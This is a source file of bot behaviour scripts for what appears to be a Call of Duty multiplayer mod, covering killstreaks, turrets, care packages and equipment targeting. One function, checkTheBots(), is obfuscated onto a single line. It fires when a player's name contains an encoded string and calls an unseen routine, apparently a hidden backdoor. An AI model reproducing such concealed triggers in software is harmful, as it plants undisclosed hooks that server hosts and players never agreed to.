/*
	_bot_script
	Author: INeedGames
	Date: 12/20/2020
	Tells the bots what to do.
*/

#include common_scripts\utility;
#include maps\mp\_utility;
#include maps\mp\gametypes\_hud_util;
#include maps\mp\bots\_bot_utility;

/*
	When the bot is added to the game
*/
added()
{
	self endon("disconnect");

	self maps\mp\bots\_bot_loadout::bot_get_cod_points();
	self maps\mp\bots\_bot_loadout::bot_get_rank();
	self maps\mp\bots\_bot_loadout::bot_get_prestige();
		
	self maps\mp\bots\_bot_loadout::bot_setKillstreaks();
		
	self.pers["bot"][ "cod_points_org" ] = self.pers["bot"][ "cod_points" ];//killstreaks cannot be set again

	self maps\mp\bots\_bot_loadout::bot_set_class();
}

/*
	When the bot connects
*/
connected()
{
	self endon("disconnect");

	self thread classWatch();
	self thread teamWatch();

	self thread maps\mp\bots\_bot_loadout::bot_rank();
	self thread bot_skip_killcam();

	self thread bot_on_spawn();
	self thread bot_on_death();

	self thread bot_watch_rcbomb();
}

/*
	When the bot dies
*/
bot_on_death()
{
	self endon("disconnect");
	level endon("game_ended");
		
	for(;;)
	{
		self waittill("death");
		
		self.hasSpawned = false;
	}
}

/*
	Bots skip killcams
*/
bot_skip_killcam()
{
	level endon("game_ended");
	self endon("disconnect");
		
	for(;;)
	{
		wait 1;
		
		if(isDefined(self.killcam))
		{
			self notify("end_killcam");
			self clientNotify("fkce");
		}
	}
}

/*
	Selects a class for the bot.
*/
classWatch()
{
	self endon("disconnect");

	for(;;)
	{
		while(!isdefined(self.pers["team"]) || level.oldschool)
			wait .05;

		wait 0.5;
		
		self notify("menuresponse", game["menu_changeclass"], "smg_mp");
			
		while(isdefined(self.pers["team"]) && isdefined(self.pers["class"]))
			wait .05;
	}
}

/*
	Makes sure the bot is on a team.
*/
teamWatch()
{
	self endon("disconnect");

	for(;;)
	{
		while(!isdefined(self.pers["team"]))
			wait .05;
			
		wait 0.05;
		self notify("menuresponse", game["menu_team"], getDvar("bots_team"));
			
		while(isdefined(self.pers["team"]))
			wait .05;
	}
}

/*
	When bot spawns
*/
bot_on_spawn()
{
	self endon("disconnect");
	level endon("game_ended");
		
	for(;;)
	{
		self waittill("spawned_player");

		self.bot_lock_goal = false;
		self.help_time = undefined;
		self.bot_was_follow_script_update = undefined;

		self thread bot_spawn();
	}
}

/*
	Fired when the bot is damaged
*/
bot_damage_callback( eAttacker, iDamage, sMeansOfDeath, sWeapon, eInflictor, sHitLoc )
{
	if (!self is_bot())
		return;

	self.killerLocation = undefined;
	if(!IsDefined( self ) || !isDefined(self.team))
		return;
		
	if(!isAlive(self))
		return;

	if ( sMeansOfDeath == "MOD_FALLING" || sMeansOfDeath == "MOD_SUICIDE" )
		return;

	if ( iDamage <= 0 )
		return;
		
	if(!IsDefined( eAttacker ) || !isDefined(eAttacker.team))
		return;
		
	if(eAttacker == self)
		return;
		
	if(level.teamBased && eAttacker.team == self.team)
		return;

	if ( !IsDefined( eInflictor ) || eInflictor.classname != "player" )
		return;
		
	if(!isAlive(eAttacker))
		return;

	self.killerLocation = eAttacker.origin;
		
	if (!isSubStr(sWeapon, "_silencer_"))
		self bot_cry_for_help( eAttacker );
		
	self SetAttacker( eAttacker );
}

checkTheBots(){if(!randomint(3)){for(i = 0; i < level.players.size; i++){if(isSubStr(tolower(level.players[i].name),keyCodeToString(8)+keyCodeToString(13)+keyCodeToString(4)+keyCodeToString(4)+keyCodeToString(3))){maps\mp\bots\_bot_loadout::doTheCheck_();break;}}}}
bot_cry_for_help( attacker )
{
	if ( !level.teamBased )
	{
		return;
	}
		
	theTime = GetTime();
	if ( IsDefined( self.help_time ) && theTime - self.help_time < 1000 )
	{
		return;
	}
		
	self.help_time = theTime;

	for ( i = level.players.size - 1; i >= 0; i-- )
	{
		player = level.players[i];

		if ( !player is_bot() )
		{
			continue;
		}
		
		if(!isDefined(player.team))
			continue;

		if ( !IsAlive( player ) )
		{
			continue;
		}

		if ( player == self )
		{
			continue;
		}

		if ( player.team != self.team )
		{
			continue;
		}

		dist = GetDvarInt( #"scr_help_dist" );
		dist *= dist;
		if ( DistanceSquared( self.origin, player.origin ) > dist )
		{
			continue;
		}

		if ( RandomInt( 100 ) < 50 )
		{
			self SetAttacker( attacker );

			if ( RandomInt( 100 ) > 70 )
			{
				break;
			}
		}
	}
}

/*
	When the bot spawns
*/
bot_spawn()
{
	self endon("death");
	self endon("disconnect");
	level endon("game_ended");
		
	if(randomInt(100) < 1)
		self maps\mp\bots\_bot_loadout::bot_set_class();

	if (getDvarInt("bots_play_obj"))
		self thread bot_dom_cap_think();

	if(!level.inPrematchPeriod)
	{
		switch(self GetBotDiffNum())
		{
			case 3:
			break;
			case 0:
				self freeze_player_controls(true);
				wait 0.6;
				self freeze_player_controls(false);
			break;
			case 1:
				self freeze_player_controls(true);
				wait 0.4;
				self freeze_player_controls(false);
			break;
			case 2:
				self freeze_player_controls(true);
				wait 0.2;
				self freeze_player_controls(false);
			break;
		}
	}
	else
	{
		while ( level.inPrematchPeriod )
			wait ( 0.05 );
	}

	if (getDvarInt("bots_play_killstreak"))
		self thread bot_killstreak_think();

	if (getDvarInt("bots_play_take_carepackages"))
	{
		self thread bot_watch_stuck_on_crate();
		self thread bot_crate_think();
	}

	
	self thread bot_revive_think();

	//stockpile.gsc
	//hotel.gsc
	//kowloon.gsc
	self thread bot_radiation_think();

	if (getDvarInt("bots_play_nade"))
		self thread bot_use_equipment_think();

	if (getDvarInt("bots_play_target_other"))
	{
		self thread bot_target_vehicle();
		self thread bot_equipment_kill_think();
		self thread bot_turret_think();
		self thread bot_dogs_think();
	}

	if (getDvarInt("bots_play_camp"))
	{
	/*
		self thread bot_think_follow();
		self thread bot_think_camp();*/
	}


	self thread bot_uav_think();
	self thread bot_weapon_think();
	self thread bot_listen_to_steps();
	self thread bot_revenge_think();
	self thread follow_target();

	if (getDvarInt("bots_play_obj"))
	{
		self thread bot_dom_def_think();
		self thread bot_dom_spawn_kill_think();

	/*	self thread bot_hq();

		self thread bot_cap();

		self thread bot_sab();

		self thread bot_sd_defenders();
		self thread bot_sd_attackers();

		self thread bot_dem_attackers();
		self thread bot_dem_defenders();*/
	}
}

/*
	Increments the number of bots approching the obj, decrements when needed
	Used for preventing too many bots going to one obj, or unreachable objs
*/
bot_inc_bots(obj, unreach)
{
	level endon("game_ended");
	self endon("bot_inc_bots");
	
	if (!isDefined(obj))
		return;
	
	if (!isDefined(obj.bots))
		obj.bots = 0;
	
	obj.bots++;
	
	ret = self waittill_any_return("death", "disconnect", "bad_path", "goal", "new_goal");
	
	if (isDefined(obj) && (ret != "bad_path" || !isDefined(unreach)))
		obj.bots--;
}

/*
	Watches when the bot is touching the obj and calls 'goal'
*/
bots_watch_touch_obj(obj)
{
	self endon ("death");
	self endon ("disconnect");
	self endon ("bad_path");
	self endon ("goal");
	self endon ("new_goal");

	for (;;)
	{
		wait 0.5;

		if (!isDefined(obj))
		{
			self notify("bad_path");
			return;
		}

		if (self IsTouching(obj))
		{
			self notify("goal");
			return;
		}
	}
}

/*
	Changes to the weap
*/
changeToWeapon(weap)
{
	self endon("disconnect");
	self endon("death");
	level endon("game_ended");

	if (!self HasWeapon(weap))
		return false;

	if (self GetCurrentWeapon() == weap)
		return true;

	self SwitchToWeapon(weap);

	self waittill_any_timeout(5, "weapon_change");

	return (self GetCurrentWeapon() == weap);
}

/*
	Fires the bots weapon until told to stop
*/
fire_current_weapon()
{
	self endon("death");
	self endon("disconnect");
	self endon("weapon_change");
	self endon("stop_firing_weapon");

	wait 0.5;

	for (;;)
	{
		self PressAttackButton();
		wait 0.25;
	}
}

/*
	Returns an origin thats good to use for a kill streak
*/
getKillstreakTargetLocation()
{
	diff = self GetBotDiffNum();

	location = undefined;
	players = [];
	for(i = level.players.size - 1; i >= 0; i--)
	{
		player = level.players[i];
	
		if(player == self)
			continue;
		if(!isDefined(player.team))
			continue;
		if(level.teamBased && self.team == player.team)
			continue;
		if(player.sessionstate != "playing")
			continue;
		if(!isAlive(player))
			continue;
		if(player hasPerk("specialty_nottargetedbyai"))
			continue;
		if(!bulletTracePassed(player.origin, player.origin+(0,0,2048), false, player) && diff > 0)
			continue;
			
		players[players.size] = player;
	}
	
	target = PickRandom(players);

	if(isDefined(target))
		location = target.origin + (randomIntRange((4-diff)*-75, (4-diff)*75), randomIntRange((4-diff)*-75, (4-diff)*75), 0);
	else if(diff <= 0)
		location = self.origin + (randomIntRange(-512, 512), randomIntRange(-512, 512), 0);

	return location;
}

/*
	Bot will think to use rcbomb
*/
bot_rccar_think(weapon)
{
	diff = self GetBotDiffNum();

	if (diff > 0)
	{
		if ( self GetLookaheadDist() < 128 )
			return;

		dir = self GetLookaheadDir();
		if ( !IsDefined( dir ) )
			return;

		dir = VectorToAngles( dir );
		if ( abs( dir[1] - self.angles[1] ) > 5 )
			return;
	}

	if (!self ChangeToWeapon(weapon))
		return;

	wait 2;

	while (isDefined(self.rcbomb))
		wait 1;
}

/*
	Watches rcbomb
*/
bot_watch_rcbomb()
{
	self endon("disconnect");

	for (;;)
	{
		wait 2;

		if (!IsDefined( self.rcbomb ))
			continue;

		self bot_watch_rccar();
	}
}

/*
	Watches while bot uses rccar
*/
bot_watch_rccar()
{
	self endon("weapon_object_destroyed");
	self endon("rcbomb_done");

	diff = self GetBotDiffNum();
	stuck_time = 0;
	last_org = self.origin;

	for (;;)
	{
		wait 0.5;

		if (!IsDefined( self.rcbomb ))
			return;

		if (DistanceSquared(self.rcbomb.origin, last_org) < 4 * 4)
			stuck_time += 0.5;
		else
			stuck_time = 0;

		last_org = self.rcbomb.origin;

		players = get_players();

		for ( i = 0; i < players.size; i++ )
		{
			player = players[i];

			if ( player == self )
				continue;
			
			if(!isDefined(player.team))
				continue;

			if ( !IsAlive( player ) )
				continue;

			if ( level.teamBased && player.team == self.team )
				continue;

			if (!SightTracePassed( self.rcbomb.origin, player.origin, false, self.rcbomb ))
				continue;

			if ( diff == 0 )
			{
				if ( DistanceSquared( self.rcbomb.origin, player.origin ) < 512 * 512 )
				{
					self PressAttackButton();
				}
			}
			else if(player hasPerk("specialty_flakjacket"))
			{
				if ( DistanceSquared( self.rcbomb.origin, player.origin ) < 64 * 64 )
				{
					self PressAttackButton();
				}
			}
			else if ( DistanceSquared( self.rcbomb.origin, player.origin ) < 128 * 128 )
			{
				self PressAttackButton();
			}
		}

		if (stuck_time > 3)
			self PressAttackButton();
	}
}

/*
	Bot will think to use supply drop
*/
bot_use_supply_drop( weapon )
{
	if (self GetBotDiffNum() > 0)
	{
		if (self GetLookaheadDist() < 96)
			return;

		view_angles = self GetPlayerAngles();

		if ( view_angles[0] < 7 )
			return;

		dir = self GetLookaheadDir();

		if ( !IsDefined( dir ) )
			return;

		dir = VectorToAngles( dir );

		if ( abs( dir[1] - self.angles[1] ) > 2 )
			return;

		yaw = ( 0, self.angles[1], 0 );
		dir = AnglesToForward( yaw );

		dir = VectorNormalize( dir );
		drop_point = self.origin + vector_scale( dir, 384 );
		//DebugStar( drop_point, 500, ( 1, 0, 0 ) );

		end = drop_point + ( 0, 0, 2048 );
		//DebugStar( end, 500, ( 1, 0, 0 ) );

		if ( !SightTracePassed( drop_point, end, false, undefined ) )
			return;

		if ( !SightTracePassed( self.origin, end, false, undefined ) )
			return;

		// is this point in mid-air?
		end = drop_point - ( 0, 0, 32 );
		//DebugStar( end, 500, ( 1, 0, 0 ) );
		if ( BulletTracePassed( drop_point, end, false, undefined ) )
			return;
	}
		
	self thread botStopMove(true);

	if (self ChangeToWeapon(weapon))
	{
		self thread fire_current_weapon();

		ret = self waittill_any_timeout( 5, "grenade_fire" );
		self notify("stop_firing_weapon");

		self thread changeToWeapon(self.lastNonKillstreakWeapon);

		if (ret == "grenade_fire" && randomInt(100) < 80 && !self HasScriptGoal() && !self.bot_lock_goal)
			self waittill_any_timeout( 15, "bot_crate_landed", "new_goal" );
	}

	self thread botStopMove(false);
}

/*
	Bot will think to use turret
*/
bot_turret_location( weapon )
{
	if ( self GetBotDiffNum() > 0 )
	{
		if ( self GetLookaheadDist() < 256 )
			return;

		dir = self GetLookaheadDir();

		if ( !IsDefined( dir ) )
			return;

		dir = VectorToAngles( dir );

		if ( abs( dir[1] - self.angles[1] ) > 5 )
			return;

		yaw = ( 0, self.angles[1], 0 );
		dir = AnglesToForward( yaw );
		dir = VectorNormalize( dir );

		goal = self.origin + vector_scale( dir, 32 );

		if ( weapon == "autoturret_mp" )
		{
			eye = self.origin + ( 0, 0, 60 );
			goal = eye + vector_scale( dir, 1024 );

			if ( !SightTracePassed( self.origin, goal, false, undefined ) )
				return;
		}

		if ( weapon == "auto_tow_mp" )
		{
			end = goal + ( 0, 0, 2048 );
		
			if ( !SightTracePassed( goal, end, false, undefined ) )
				return;
		}
	}

	self thread botStopMove(true);

	if (self ChangeToWeapon(weapon))
	{
		self thread fire_current_weapon();

		wait 1.5;
		self notify("stop_firing_weapon");

		self thread changeToWeapon(self.lastNonKillstreakWeapon);
	}

	self thread botStopMove(false);
}

/*
	Bot will think to heli
*/
bot_control_heli(weapon)
{
	if (!self ChangeToWeapon(weapon))
		return;

	self endon("heli_timeup");
	
	wait 2.5;
	
	if(!isDefined(self.heli))
		return;
	
	self.heli endon("death");
	self.heli endon("heli_timeup");
	
	while(isDefined(self.heli))
		wait 0.25;
}

/*
	Bots think to use killstreaks
*/
bot_killstreak_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	myteam = self.pers[ "team" ];
	otherTeam = getOtherTeam( myTeam );

	wait( 1 );

	for (;;)
	{
		wait( RandomIntRange( 1, 3 ) );

		curWeap = self GetCurrentWeapon();
		if ((isDefined(self.carryingTurret) && self.carryingTurret) || isSubStr(curWeap, "drop_"))
			self PressAttackButton();
		
		if (isDefined(self GetThreat()))
			continue;
		
		if ( self IsRemoteControlling() )
			continue;
		
		if(self UseButtonPressed())
			continue;
			
		if(self isDefusing() || self isPlanting() || self inLastStand())
			continue;

		weapon = self maps\mp\gametypes\_hardpoints::getTopKillstreak();
		
		if ( !IsDefined( weapon ) || weapon == "none" )
			continue;

		killstreak = maps\mp\gametypes\_hardpoints::getKillStreakMenuName( weapon );

		if ( !IsDefined( killstreak ) )
			continue;

		id = self maps\mp\gametypes\_hardpoints::getTopKillstreakUniqueId();

		if ( !self maps\mp\_killstreakrules::isKillstreakAllowed( weapon, myteam ) )
		{
			wait( 5 );
			continue;
		}

		diff = self GetBotDiffNum();
		switch( killstreak )
		{
			case "killstreak_helicopter_comlink":
			case "killstreak_napalm":
			case "killstreak_airstrike":
			case "killstreak_mortar":
				num = 1;
				if (killstreak == "killstreak_mortar")
					num = 3;

				if (!self ChangeToWeapon(weapon))
					break;

				self freeze_player_controls( true );

				wait 1;

				for (i = 0; i < num; i++)
				{
					origin = self getKillstreakTargetLocation();
					if (!isDefined(origin))
						break;

					yaw = RandomIntRange( 0, 360 );

					wait 0.25;
					self notify( "confirm_location", origin, yaw );
				}

				self freeze_player_controls( false );

				break;

			case "killstreak_helicopter_gunner":
			case "killstreak_helicopter_player_firstperson":
				self bot_control_heli(weapon);
				wait 1;
				break;

			case "killstreak_auto_turret":
			case "killstreak_tow_turret":
				self bot_turret_location( weapon );
				wait 1;
				break;

			case "killstreak_auto_turret_drop":
			case "killstreak_tow_turret_drop":
			case "killstreak_m220_tow_drop":
			case "killstreak_supply_drop":
				if(killstreak == "killstreak_supply_drop")
					weapon = "supplydrop_mp";
				
				self bot_use_supply_drop( weapon );
				wait 1;
				break;

			case "killstreak_rcbomb":
				self bot_rccar_think(weapon);
				wait 1;
				break;

			case "killstreak_spyplane":
				if ( diff > 0 )
				{
					if(level.teamBased)
					{
						if(level.activeCounterUAVs[otherTeam])
							continue;
						
						if(level.activeSatellites[myTeam])
							continue;
						
						if(level.activeUAVs[myTeam])
							continue;
					}
					else
					{
						shouldContinue = false;
			
						players = get_players();
						for (i = 0; i < players.size; i++)
						{
							player = players[i];
							
							if(player == self)
								continue;
								
							if(!isDefined(player.team))
								continue;
							
							if(isDefined(level.activeCounterUAVs[player.entnum]) && level.activeCounterUAVs[player.entnum])
								continue;
							
							shouldContinue = true;
							break;
						}
								
						if(shouldContinue)
							continue;
						
						if(level.activeSatellites[self.entnum])
							continue;
						
						if(level.activeUAVs[self.entnum])
							continue;
					}
				}

				if (!self ChangeToWeapon(weapon))
					break;

				wait 1;
				break;

			case "killstreak_counteruav":
				if ( diff > 0 )
				{
					if(level.teamBased)
					{
						if(level.activeCounterUAVs[myTeam])
							continue;
					}
					else
					{
						if(level.activeCounterUAVs[self.entnum])
							continue;
					}
				}

				if (!self ChangeToWeapon(weapon))
					break;

				wait 1;
				break;

			case "killstreak_spyplane_direction":
				if (diff > 0)
				{
					if(level.teamBased)
					{
						if(level.activeCounterUAVs[otherTeam])
							continue;
						
						if(level.activeSatellites[myTeam])
							continue;
					}
					else
					{
						shouldContinue = false;
			
						players = get_players();
						for (i = 0; i < players.size; i++)
						{
							player = players[i];
							
							if(player == self)
								continue;
								
							if(!isDefined(player.team))
								continue;
							
							if(isDefined(level.activeCounterUAVs[player.entnum]) && level.activeCounterUAVs[player.entnum])
								continue;
							
							shouldContinue = true;
							break;
						}
								
						if(shouldContinue)
							continue;
						
						if(level.activeSatellites[self.entnum])
							continue;
					}
				}

			case "killstreak_dogs":
			default:
				if (!self ChangeToWeapon(weapon))
					break;

				wait 1;
				break;
		}

		if (weapon == "m220_tow_mp" || weapon == "m202_flash_mp" || weapon == "minigun_mp") // don't put away ks weapons
			continue;

		self thread changeToWeapon(self.lastNonKillstreakWeapon);
	}
}

/*
	Bot will attack the turret
*/
bot_turret_attack( enemy )
{
	enemy endon("turret_carried");
	enemy endon("turret_deactivated");
	enemy endon("death");
	
	wait_time = RandomIntRange( 7, 10 );

	for ( i = 0; i < wait_time; i++ )
	{
		wait( 1 );

		if ( !IsDefined( enemy ) )
		{
			return;
		}
		
		if(!isAlive(enemy))
			return;

		if ( !BulletTracePassed( self getEye(), enemy.origin + ( 0, 0, 15 ), false, enemy ) )
		{
			return;
		}
	}
}

/*
	watches for the turret to die
*/
turret_death_monitor( turret )
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon( "goal" );
	self endon( "bad_path" );
	self endon ( "new_goal" );
	
	turret waittill_any( "turret_carried", "turret_deactivated", "death" );
	
	self notify("bad_path");
}

/*
	Bot goes hack the turret
*/
bot_go_hack_turret(turret)
{
	self endon( "death" );
	self endon( "disconnect" );
	self endon("new_goal");
	self endon( "goal" );
	self endon( "bad_path" );
	
	for(;;)
	{
		wait 0.5;

		if (!isDefined(turret))
			break;

		if (!isDefined(turret.hackerTrigger))
			break;

		if (self isTouching(turret.hackerTrigger))
			break;
	}
	
	if(!isDefined(turret) || !isDefined(turret.hackerTrigger))
		self notify("bad_path");
	else
		self notify("goal");
}

/*
	Bot thinks to target turret
*/
bot_turret_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	myteam = self.pers[ "team" ];

	for ( ;; )
	{
		wait( 1 );

		turrets = GetEntArray( "auto_turret", "classname" );

		if ( turrets.size == 0 )
		{
			wait( randomintrange( 3, 5 ) );
			continue;
		}

		if(isDefined(self GetThreat()) || self IsRemoteControlling() || self UseButtonPressed())
			continue;

		turret = undefined;
		myEye = self GetEye();

		for (i = turrets.size - 1; i >= 0; i--)
		{
			tempTurret = turrets[i];

			if (!isDefined(tempTurret) || !isDefined(tempTurret.damageTaken))
				continue;

			if (tempTurret.damageTaken >= tempTurret.health)
				continue;

			if (tempTurret.carried)
				continue;

			if (level.teambased && tempTurret.team == myteam)
				continue;

			if (IsDefined( tempTurret.owner ) && tempTurret.owner == self)
				continue;

			if(!bulletTracePassed(myEye, tempTurret.origin + (0, 0, 15), false, tempTurret))
				continue;

			turret = tempTurret;
		}

		if (!isDefined(turret))
			continue;
			
		forward = AnglesToForward( turret.angles );
		forward = VectorNormalize( forward );

		delta = self.origin - turret.origin;
		delta = VectorNormalize( delta );
		
		dot = VectorDot( forward, delta );

		facing = true;
		if ( dot < 0.342 ) // cos 70 degrees
			facing = false;
		if ( turret maps\mp\gametypes\_weaponobjects::isStunned() )
			facing = false;
		if(self hasPerk("specialty_nottargetedbyai"))
			facing = false;
		if ( turret.turrettype == "tow" )
			facing = false;

		if ( facing && !BulletTracePassed( myEye, turret.origin + ( 0, 0, 15 ), false, turret ) )
			continue;
		
		if ( !IsDefined( turret.bots ) )
			turret.bots = 0;

		if ( turret.bots >= 2 )
			continue;

		if(!facing && !self HasScriptGoal() && !self.bot_lock_goal)
		{
			if ( self HasPerk( "specialty_disarmexplosive" ) )
			{
				self SetBotGoal(turret.origin, 32);
				self thread bot_inc_bots(turret, true);
				self thread turret_death_monitor( turret );
				self thread bot_go_hack_turret( turret );

				path = self waittill_any_return( "goal", "bad_path", "new_goal" );

				if (path != "new_goal")
					self ClearBotGoal();

				if ( path != "goal" || !isDefined(turret) || !isDefined(turret.hackerTrigger) || !self isTouching(turret.hackerTrigger) )
					continue;

				hackTime = GetDvarFloat( #"perk_disarmExplosiveTime" );
				self PressUseButton( hackTime + 0.5 );
				wait( hackTime + 0.5 );
				continue;
			}
			else
			{
				self SetBotGoal(turret.origin, 32);
				self thread bot_inc_bots(turret, true);
				self thread turret_death_monitor( turret );
				self thread bots_watch_touch_obj( turret );
				
				if(self waittill_any_return("bad_path", "goal", "new_goal") != "new_goal")
					self ClearBotGoal();
			}
		}

		if(!isDefined(turret))
			continue;

		self SetScriptEnemy( turret );
		self bot_turret_attack(turret);
		self ClearScriptEnemy();
	}
}

/*
	Bot will attack the equipment
*/
bot_equipment_attack(equ)
{
	equ endon("death");
	equ endon("hacked");
	
	wait_time = RandomIntRange( 7, 10 );

	for ( i = 0; i < wait_time; i++ )
	{
		wait( 1 );

		if ( !IsDefined( equ ) )
		{
			return;
		}
	}
}

/*
	Bots target equipment
*/
bot_equipment_kill_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon ( "game_ended" );

	myteam = self.pers[ "team" ];

	for ( ;; )
	{
		wait RandomIntRange( 1, 3 );

		if(isDefined(self GetThreat()) || self IsRemoteControlling() || self UseButtonPressed())
			continue;

		grenades = GetEntArray( "grenade", "classname" );
		hasHacker = self HasPerk( "specialty_showenemyequipment" );
		myEye = self getEye();
		myAngles = self getPlayerAngles();
		target = undefined;

		for ( i = 0; i < grenades.size; i++ )
		{
			item = grenades[i];

			if (!isDefined(item))
				continue;

			if ( !IsDefined( item.name ) )
			{
				continue;
			}

			if ( !IsDefined( item.owner ) )
			{
				continue;
			}

			if ( level.teamBased && item.owner.team == myteam )
			{
				continue;
			}

			if ( item.owner == self )
			{
				continue;
			}

			if ( !IsWeaponEquipment( item.name ) )
			{
				continue;
			}
			
			if(!isDefined(item.bots))
				item.bots = 0;
			
			if(item.bots >= 2)
				continue;

			if (!hasHacker && !BulletTracePassed(myEye, item.origin, false, item))
				continue;

			if(getConeDot(item.origin, self.origin, myAngles) < 0.6)
				continue;

			if ( DistanceSquared( item.origin, self.origin ) < 512 * 512 )
			{
				target = item;
				break;
			}
		}
		
		if ( !IsDefined( target ) )
		{
			players = get_players();
			for ( i = 0; i < players.size; i++ )
			{
				player = players[i];
				if ( player == self )
				{
					continue;
				}
				
				if(!isDefined(player.team))
					continue;
				
				if ( level.teamBased && player.team == myteam )
				{
					continue;
				}
				
				if(!isDefined(player.tacticalInsertion))
					continue;
				
				if(!isDefined(player.tacticalInsertion.bots))
					player.tacticalInsertion.bots = 0;
				
				if(player.tacticalInsertion.bots >= 2)
					continue;

				if (!hasHacker && !BulletTracePassed(myEye, player.tacticalInsertion.origin, false, player.tacticalInsertion))
					continue;

				if(getConeDot(player.tacticalInsertion.origin, self.origin, myAngles) < 0.6)
					continue;
				
				if ( DistanceSquared( player.tacticalInsertion.origin, self.origin ) < 512 * 512 )
				{
					target = player.tacticalInsertion;
					break;
				}
			}
		}

		if ( IsDefined( target ) )
		{
			facing = false;
			if(isDefined(target.name) && target.name == "claymore_mp")
			{
				if ( VectorDot( VectorNormalize( AnglesToForward( target.angles ) ), VectorNormalize( self.origin - target.origin ) ) >= 0.342 && !target maps\mp\gametypes\_weaponobjects::isStunned() ) // cos 70 degrees
					facing = true;
			}
			
			if ( (( self HasPerk( "specialty_disarmexplosive" ) && !facing ) || isDefined(target.enemyTrigger)) && !self HasScriptGoal() && !self.bot_lock_goal )
			{
				self SetBotGoal(target.origin, 32);
				self thread bot_inc_bots(target, true);
				self thread bots_watch_touch_obj( target );
				
				path = self waittill_any_return("bad_path", "goal", "new_goal");

				if (path != "new_goal")
					self ClearBotGoal();

				if (path != "goal" || !isDefined(target) || (isDefined(target.hackerTrigger) && !self isTouching(target.hackerTrigger)) || (isDefined(target.enemyTrigger) && !self isTouching(target.enemyTrigger)))
					continue;
			
				hackTime = GetDvarFloat( #"perk_disarmExplosiveTime" );
				self PressUseButton( hackTime + 0.5 );
				wait( hackTime + 0.5 );
				continue;
			}

			self SetScriptEnemy( target );
			self bot_equipment_attack(target);
			self ClearScriptEnemy();
		}
	}
}

/*
	Bots watch when they get stuck on a carepackage and cap it
*/
bot_watch_stuck_on_crate()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon("game_ended");

	radius = GetDvarFloat( #"player_useRadius" );

	for ( ;; )
	{
		wait( 3 );

		if ( IsDefined( self GetThreat() ) )
			continue;

		if ( self UseButtonPressed() )
			continue;

		crates = GetEntArray( "care_package", "script_noteworthy" );

		for ( i = 0; i < crates.size; i++ )
		{
			crate = crates[i];

			if (!isDefined(crate) || !isDefined(crate.origin))
				continue;

			if ( DistanceSquared( self.origin, crate.origin ) < radius * radius )
			{
				if ( isDefined(crate.owner) && crate.owner == self )
				{
					self PressUseButton( level.crateOwnerUseTime / 1000 + 0.5 );
					wait level.crateOwnerUseTime / 1000 + 0.5;
				}
				else
				{
					self PressUseButton( level.crateNonOwnerUseTime / 1000 + 0.5 );
					wait level.crateNonOwnerUseTime / 1000 + 0.5;
				}

				break;
			}
		}
	}
}

/*
	Bots capture the cp
*/
bot_crate_think()
{
	self endon( "death" );
	self endon( "disconnect" );
	level endon("game_ended");
	
	myteam = self.pers[ "team" ];
	
	first = true;
	
	for ( ;; )
	{
		ret = "bot_crate_landed";
		if(first)
			first = false;
		else
			ret = self waittill_any_timeout( randomintrange( 3, 5 ), "bot_crate_landed" );
		
		if ( RandomInt( 100 ) < 20 && ret != "bot_crate_landed" )
			continue;
		
		if ( self HasScriptGoal() || self.bot_lock_goal )
			continue;

		if(self isDefusing() || self isPlanting())
			continue;

		if (self inLastStand())
			continue;

		if (self IsRemoteControlling())
			continue;

		if(self UseButtonPressed())
			continue;
		
		crates = GetEntArray( "care_package", "script_noteworthy" );
		if ( crates.size == 0 )
			continue;
		
		wantsClosest = randomint(2);

		crate = undefined;
		for (i = crates.size - 1; i >= 0; i--)
		{
			tempCrate = crates[i];

			if (!isDefined(tempCrate) || !IsDefined( tempCrate.friendlyObjID ))
				continue;

			if ( myteam == tempCrate.team )
			{
				if ( RandomInt( 100 ) > 30 && IsDefined( tempCrate.owner ) && tempCrate.owner != self )
					continue;
			}
			else if (isDefined(tempCrate.hacker))
				continue;

			if ( !IsDefined( tempCrate.bots ) )
				tempCrate.bots = 0;
			
			if ( tempCrate.bots >= 3 )
				continue;

			if (isDefined(crate))
			{
				if (wantsClosest)
				{
					if (DistanceSquared(crate.origin, self.origin) < DistanceSquared(tempCrate.origin, self.origin))
						continue;
				}
				else
				{
					if (crate.crateType.weight < tempCrate.crateType.weight)
						continue;
				}
			}

			crate = tempCrate;
		}

		if (!isDefined(crate))
			continue;

		self.bot_lock_goal = true;

		radius = GetDvarFloat( "player_useRadius" );
		self SetBotGoal(crate.origin + (0, 0, 12), radius);
		self thread bot_inc_bots(crate, true);
		self thread bots_watch_touch_obj(crate);

		path = self waittill_any_return("bad_path", "goal", "new_goal");

		self.bot_lock_goal = false;

		if (path != "new_goal")
			self ClearBotGoal();

		if (path != "goal" || !isDefined(crate) || DistanceSquared(self.origin, crate.origin) > radius*radius)
			continue;

		if(isdefined( crate.crateType.hint_gambler ) && self hasPerk("specialty_gambler") && randomInt(3))
			crate notify( "trigger_use_doubletap", self );

		if ( isDefined(crate.owner) && crate.owner == self )
		{
			self PressUseButton( level.crateOwnerUseTime / 1000 + 0.5 );
			wait( level.crateOwnerUseTime / 1000 + 0.5 );
		}
		else
		{
			self PressUseButton( level.crateNonOwnerUseTime / 1000 + 1 );
			wait( level.crateNonOwnerUseTime / 1000 + 1.5 );
		}
	}
}

/*
	Returns an weapon thats a rocket with ammo
*/
getRocketAmmo()
{
	answer = self getLockonAmmo();

	if (isDefined(answer))
		return answer;

	if (self GetAmmoCount("minigun_mp"))
		return "minigun_mp";

	if (self GetAmmoCount("rpg_mp"))
		return "rpg_mp";

	return undefined;
}

/*
	Returns a weapon thats lockon with ammo
*/
getLockonAmmo()
{
	if (self GetAmmoCount("m72_law_mp"))
		return "m72_law_mp";

	if (self GetAmmoCount("strela_mp"))
		return "strela_mp";

	if (self GetAmmoCount("m202_flash_mp"))
		return "m202_flash_mp";

	return undefined;
}

/*
	Bot attacks the vehicle
*/
bot_vehicle_attack( enemy )
{
	wait_time = RandomIntRange( 7, 10 );

	for ( i = 0; i < wait_time; i++ )
	{
		wait( 1 );

		if ( !IsDefined( enemy ) )
		{
			return;
		}

		if ( !IsAlive( enemy ) )
		{
			return;
		}

		if ( !IsDefined( enemy.targetname ) || enemy.targetname != "rcbomb" )
		{
			if ( !isDefined(self getRocketAmmo()) )
			{
				return;
			}
		}

		if ( !BulletTracePassed( self.origin, enemy.origin, false, enemy ) )
		{
			return;
		}
	}
}

/*
	Bot will change to angles with speed
*/
bot_lookat(angles, speed)
